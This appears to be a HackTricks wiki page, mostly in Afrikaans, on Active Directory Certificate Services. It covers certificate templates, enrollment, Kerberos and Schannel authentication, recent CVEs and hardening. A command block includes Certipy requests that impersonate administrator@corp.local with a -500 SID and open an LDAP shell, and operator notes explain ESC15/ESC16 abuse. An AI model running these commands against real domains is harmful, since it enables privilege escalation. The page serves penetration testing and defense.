# AD Certificates

{{#include ../../banners/hacktricks-training.md}}

## Inleiding

### Komponente van 'n Sertifikaat

- Die **Subject** van die sertifikaat dui die eienaar daarvan aan.
- 'n **Public Key** word met 'n privaat beheerde sleutel gepaar om die sertifikaat aan sy regmatige eienaar te koppel.
- Die **Validity Period**, gedefinieer deur die **NotBefore**- en **NotAfter**-datums, dui die sertifikaat se geldigheidsduur aan.
- 'n Unieke **Serial Number**, verskaf deur die Certificate Authority (CA), identifiseer elke sertifikaat.
- Die **Issuer** verwys na die CA wat die sertifikaat uitgereik het.
- **SubjectAlternativeName** laat bykomende name vir die subject toe, wat identifikasiefleksibiliteit verbeter.
- **Basic Constraints** identifiseer of die sertifikaat vir 'n CA of 'n eindentiteit is en definieer gebruiksbeperkings.
- **Extended Key Usages (EKUs)** omskryf die sertifikaat se spesifieke doelwitte, soos code signing of email encryption, deur middel van Object Identifiers (OIDs).
- Die **Signature Algorithm** spesifiseer die metode wat gebruik word om die sertifikaat te onderteken.
- Die **Signature**, wat met die issuer se private key geskep word, waarborg die sertifikaat se egtheid.<sup>[[4]](#references)</sup>

### Spesiale Oorwegings

- **Subject Alternative Names (SANs)** brei 'n sertifikaat se toepaslikheid na verskeie identiteite uit, wat noodsaaklik is vir bedieners met verskeie domains. Veilige uitreikingsprosesse is noodsaaklik om impersonation-risiko's te voorkom wat deur aanvallers veroorsaak kan word wanneer hulle die SAN-spesifikasie manipuleer.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) in Active Directory (AD)

AD CS erken CA-sertifikate in 'n AD forest deur middel van aangewese containers, wat elk unieke rolle vervul:<sup>[[4]](#references)</sup>

- Die **Certification Authorities**-container bevat trusted root CA-sertifikate.
- Die **Enrolment Services**-container bevat besonderhede oor Enterprise CAs en hul certificate templates.
- Die **NTAuthCertificates**-object bevat CA-sertifikate wat vir AD-authentication gemagtig is.
- Die **AIA (Authority Information Access)**-container vergemaklik certificate chain validation met intermediate en cross CA-sertifikate.

### Certificate Acquisition: Client Certificate Request Flow

1. Die versoekproses begin wanneer clients 'n Enterprise CA vind.
2. 'n CSR word geskep nadat 'n public-private key pair gegenereer is; dit bevat 'n public key en ander besonderhede.
3. Die CA evalueer die CSR teenoor die beskikbare certificate templates en reik die sertifikaat uit volgens die template se permissions.
4. Nadat dit goedgekeur is, onderteken die CA die sertifikaat met sy private key en stuur dit aan die client terug.<sup>[[4]](#references)</sup>

### Certificate Templates

Hierdie templates, wat binne AD gedefinieer word, beskryf die settings en permissions vir die uitreiking van sertifikate, insluitend toegelate EKUs en enrollment- of modification-regte, wat krities is vir die bestuur van toegang tot certificate services.<sup>[[4]](#references)</sup>

**Template schema version matters.** Legacy **v1**-templates (byvoorbeeld die ingeboude **WebServer**-template) het nie verskeie moderne enforcement-knoppies nie. Die **ESC15/EKUwu**-navorsing het getoon dat 'n requester op **v1 templates** **Application Policies/EKUs** in die CSR kan insluit wat **preferred over** die template se gekonfigureerde EKUs is, wat client-auth, enrollment agent- of code-signing-sertifikate met slegs enrollment-regte moontlik maak. Verkies **v2/v3 templates**, verwyder of vervang v1-defaults, en beperk EKUs streng tot die bedoelde doel.<sup>[[1]](#references)</sup>

## Certificate Enrollment

Die enrollment-proses vir sertifikate word deur 'n administrator begin wat **'n certificate template skep**, waarna dit deur 'n Enterprise Certificate Authority (CA) **published** word. Dit maak die template vir client enrollment beskikbaar, wat bereik word deur die template se naam by die `certificatetemplates`-veld van 'n Active Directory-object te voeg.<sup>[[4]](#references)</sup>

Om 'n sertifikaat aan te vra, moet **enrollment rights** aan 'n client toegeken word. Hierdie regte word deur security descriptors op die certificate template en die Enterprise CA self gedefinieer. Permissions moet op albei plekke toegeken word voordat 'n versoek suksesvol kan wees.

### Template Enrollment Rights

Hierdie regte word deur Access Control Entries (ACEs) gespesifiseer, wat permissions soos die volgende uiteensit:

- **Certificate-Enrollment**- en **Certificate-AutoEnrollment**-regte, elk geassosieer met spesifieke GUIDs.
- **ExtendedRights**, wat alle extended permissions toelaat.
- **FullControl/GenericAll**, wat volledige beheer oor die template verskaf.

### Enterprise CA Enrollment Rights

Die CA se regte word in sy security descriptor uiteengesit, wat deur die Certificate Authority management console verkrygbaar is. Sommige settings laat selfs remote access deur low-privileged users toe, wat 'n security concern kan wees.

### Additional Issuance Controls

Sekere controls kan van toepassing wees, soos:

- **Manager Approval**: Plaas versoeke in 'n pending state totdat dit deur 'n certificate manager goedgekeur word.
- **Enrolment Agents and Authorized Signatures**: Spesifiseer die aantal vereiste signatures op 'n CSR en die nodige Application Policy OIDs.

### Methods to Request Certificates

Sertifikate kan deur die volgende aangevra word:

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), met behulp van DCOM interfaces.
2. **ICertPassage Remote Protocol** (MS-ICPR), deur named pipes of TCP/IP.
3. Die **certificate enrollment web interface**, met die Certificate Authority Web Enrollment-role geïnstalleer.
4. Die **Certificate Enrollment Service** (CES), in samewerking met die Certificate Enrollment Policy (CEP)-service.
5. Die **Network Device Enrollment Service** (NDES) vir network devices, met behulp van die Simple Certificate Enrollment Protocol (SCEP).

Windows-users kan ook sertifikate deur die GUI (`certmgr.msc` of `certlm.msc`) of command-line tools (`certreq.exe` of PowerShell se `Get-Certificate`-command) aanvra.
```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```
## Sertifikaat-verifikasie

Active Directory (AD) ondersteun sertifikaat-verifikasie, hoofsaaklik deur gebruik te maak van die **Kerberos**- en **Secure Channel (Schannel)**-protokolle.

### Kerberos-verifikasieproses

In die Kerberos-verifikasieproses word 'n gebruiker se versoek om 'n Ticket Granting Ticket (TGT) met die **private key** van die gebruiker se sertifikaat onderteken. Hierdie versoek ondergaan verskeie validasies deur die domeinbeheerder, insluitend die sertifikaat se **geldigheid**, **pad** en **herroepingstatus**. Validasies sluit ook in om te verifieer dat die sertifikaat van 'n betroubare bron afkomstig is en om te bevestig dat die uitreiker in die **NTAUTH certificate store** voorkom. Suksesvolle validasies lei tot die uitreiking van 'n TGT. Die **`NTAuthCertificates`**-objek in AD, wat gevind word by:
```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```
is sentraal tot die vestiging van vertroue vir sertifikaat-verifikasie.<sup>[[4]](#references)</sup>

Sedert die **KB5014754**-uitrol gaan moderne Kerberos-sertifikaat-auth hoofsaaklik oor **mapping strength**, nie net EKUs nie.<sup>[[2]](#references)</sup> In geharde forests:

- ’n Sertifikaat wat slegs ’n **UPN/DNS SAN** bevat, is moontlik nie meer voldoende vir logon nie.
- Die KDC verkies ’n **strong binding**, tipies die **SID security extension** (`1.3.6.1.4.1.311.25.2`) of ’n strong eksplisiete mapping in `altSecurityIdentities`.
- As die sertifikaat nie ’n strong mapping bevat nie, teken DCs **Kdcsvc Event ID 39/41** in compatibility mode aan en weier auth in enforcement mode.
- In gemengde attack paths is **ESC9/ESC16** belangrik omdat hulle die SID extension van uitgereikte sertifikate verwyder; operators steun dan op eksplisiete mappings of SAN URL SID-formate waar die attack path dit ondersteun.

### Secure Channel (Schannel)-verifikasie

Schannel fasiliteer veilige TLS/SSL-verbindings, waar die kliënt tydens ’n handshake ’n sertifikaat aanbied wat, indien dit suksesvol gevalideer word, toegang magtig. Die mapping van ’n sertifikaat na ’n AD-rekening kan onder andere Kerberos se **S4U2Self**-funksie of die sertifikaat se **Subject Alternative Name (SAN)** behels.<sup>[[4]](#references)</sup>

Schannel is ook die praktiese fallback wanneer **PKINIT** nie beskikbaar is nie. Byvoorbeeld, as ’n domain controller nie ’n geskikte **Smart Card Logon**-sertifikaat het nie, kan `certipy auth`/PKINIT-tooling nie daarin slaag om ’n TGT te verkry nie, maar dieselfde sertifikaat kan steeds teen **LDAPS** of **LDAP StartTLS** bruikbaar wees vir verifikasie en LDAP-bewerkings.

### Enumerasie van AD Certificate Services

AD se certificate services kan deur LDAP-queries geënumeer word, wat inligting oor **Enterprise Certificate Authorities (CAs)** en hul konfigurasies openbaar. Dit is beskikbaar vir enige domain-geauthentiseerde gebruiker sonder spesiale privileges. Tools soos **[Certify](https://github.com/GhostPack/Certify)** en **[Certipy](https://github.com/ly4k/Certipy)** word vir enumerasie en vulnerability assessment in AD CS-omgewings gebruik.

Commands vir die gebruik van hierdie tools sluit in:
```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```
{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

---

## Onlangse Kwesbaarhede & Sekuriteitsopdaterings (2022-2025)

| Jaar | ID / Naam | Impak | Belangrike gevolgtrekkings |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Privilege escalation* deur masjienrekeningsertifikate tydens PKINIT te spoof. | Die patch is ingesluit by die **10 Mei 2022**-sekuriteitsopdaterings. Oudit- en strong-mapping-kontroles is via **KB5014754** bekendgestel; omgewings behoort nou in *Full Enforcement*-modus te wees.  |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* in die AD CS Web Enrollment (certsrv)- en CES-rolle. | Publieke PoCs is beperk, maar die kwesbare IIS-komponente word dikwels intern blootgestel. Gepatch vanaf **Julie 2023** se Patch Tuesday.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Op **v1 templates** kan ’n requester met enrollment-regte **Application Policies/EKUs** in die CSR insluit wat voorkeur geniet bo die template se EKUs, wat client-auth-, enrollment agent- of code-signing-sertifikate oplewer. | Gepatch vanaf **12 November 2024**. Vervang of supersede v1 templates (bv. standaard WebServer), beperk EKUs volgens bedoeling, en beperk enrollment-regte. |

### Microsoft se hardening-tydlyn (KB5014754)

Microsoft het ’n drie-fase-implementering (Compatibility → Audit → Enforcement) bekendgestel om Kerberos-sertifikaatverifikasie weg te beweeg van swak implicit mappings. Vanaf **11 Februarie 2025** skakel domain controllers outomaties oor na **Full Enforcement** indien die `StrongCertificateBindingEnforcement`-registerwaarde nie gestel is nie. Microsoft het later die tydlyn opgedateer sodat terugval na compatibility mode moontlik bly tot die **9 September 2025**-sekuriteitsopdatering.<sup>[[2]](#references)</sup> Administrateurs behoort:

1. Alle DCs en AD CS-bedieners te patch (Mei 2022 of later).
2. Event ID 39/41 vir swak mappings tydens die *Audit*-fase te monitor.
3. Client-auth-sertifikate weer uit te reik met die nuwe **SID extension**, of sterk manual mappings te konfigureer voordat enforcement swak mappings blokkeer.

### Operator-notas vir hardened forests

- **ESC1/ESC6 alleen is nie meer die hele storie** in 2025+-omgewings nie. As jy ’n sertifikaat vir ’n ander principal aanvra, benodig jy gewoonlik ook ’n strong mapping artifact soos die SID extension of ’n eksplisiete mapping.
- **ESC15 (EKUwu)** is hoofsaaklik waardevol in ongepatchte omgewings omdat dit skadelose **v1** templates soos **WebServer** in authentication- of enrollment-agent-bekwame sertifikate omskep deur **Application Policies** in te spuit. Kerberos PKINIT evalueer steeds EKUs, maar **LDAP Schannel** respekteer ook Application Policies, wat LDAP-gebaseerde misbruik relevant hou.<sup>[[1]](#references)</sup>
- **ESC16** is ’n CA-wye instelling: indien die CA die SID security extension globaal deaktiveer, val elke uitgereikte sertifikaat terug na swakker mapping-gedrag, tensy die attack chain ’n SID deur ’n ander ondersteunde formaat inspuit.

---

## Detection & Hardening-verbeterings

* **Defender for Identity AD CS sensor (2023-2024)** wys nou posture-assessments vir ESC1-ESC8/ESC11 en genereer real-time alerts soos *“Domain-controller certificate issuance for a non-DC”* (ESC8) en *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15). Verseker dat sensors op alle AD CS-bedieners ontplooi is om hierdie detections te benut.<sup>[[3]](#references)</sup>
* Deaktiveer of beperk die **“Supply in the request”**-opsie streng op alle templates; verkies eksplisiet gedefinieerde SAN/EKU-waardes.
* Verwyder **Any Purpose** of **No EKU** uit templates tensy dit absoluut vereis word (spreek ESC2-scenario’s aan).
* Vereis **manager approval** of toegewyde Enrollment Agent-workflows vir sensitiewe templates (bv. WebServer / CodeSigning).
* Beperk web enrollment (`certsrv`) en CES/NDES-endpunte tot trusted networks, of plaas dit agter client-certificate authentication.
* Dwing RPC enrollment encryption af (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) om ESC11 (RPC relay) te versag. Die flag is **by verstek aan**, maar word dikwels vir legacy clients gedeaktiveer, wat relay-risiko heropen.
* Beveilig **IIS-based enrollment endpoints** (CES/Certsrv): deaktiveer NTLM waar moontlik, of vereis HTTPS + Extended Protection om ESC8-relays te blokkeer.

---

## Verwysings

- [1] [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Certificates security posture assessments - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../banners/hacktricks-training.md}}
